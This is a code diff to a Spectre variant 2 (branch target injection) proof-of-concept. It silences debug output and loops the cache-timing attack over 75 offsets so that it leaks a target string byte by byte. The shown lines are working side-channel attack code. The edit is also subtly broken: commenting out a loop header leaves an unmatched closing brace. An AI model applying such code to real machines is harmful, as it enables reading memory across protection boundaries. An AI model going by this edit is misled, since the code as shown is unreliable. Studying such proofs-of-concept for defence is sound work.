@@ -78,7 +78,7 @@ void branch_target_injection(const void *target_address) {
   volatile uint8_t * addr;
 
   for (int trial = 0; ; ++trial) {
-    printf("trial #%d\n",trial);
+    // printf("trial #%d\n",trial);
     for (int i = 0; i < probe_lines; i++){
         _mm_clflush(&probe[i * 4096]);
     }
@@ -95,14 +95,14 @@ void branch_target_injection(const void *target_address) {
     int idx_min = 1;
     for (int i = 1; i < probe_lines; ++i)
       if (tat[i] < tat[idx_min]) idx_min = i;
-    printf("%d\n", calltime);
+    //printf("%d\n", calltime);
     if (tat[idx_min] < 100) {
       printf("trial#%d: guess='%c' (score=%llu)\n", trial, idx_min, tat[idx_min]);
-      for (int i = 0; i < probe_lines; ++i) {
-        if ((i + 1) % 16 == 0)
-          printf("% 6llu\n", tat[i]);
-        else
-          printf("% 6llu", tat[i]);
+      //for (int i = 0; i < probe_lines; ++i) {
+      //if ((i + 1) % 16 == 0)
+      //  printf("% 6llu\n", tat[i]);
+      // else
+      // printf("% 6llu", tat[i]);
       }
       break;
     }
@@ -133,7 +133,9 @@ int main(int argc, const char **argv) {
     else if (strcmp(argv[1], "--variant2") == 0) {
       printf("spectre variant2\n");
       if (JailbreakMemoryPage(reinterpret_cast<void*>(touch_and_break) ) != -1) {
-        branch_target_injection(TheAnswer + offset);
+          for (offset = 0; offset < 75; offset ++ ){
+            branch_target_injection(TheAnswer + offset);
+        }
       }
       else{printf("mprotect fail\n");}
     }
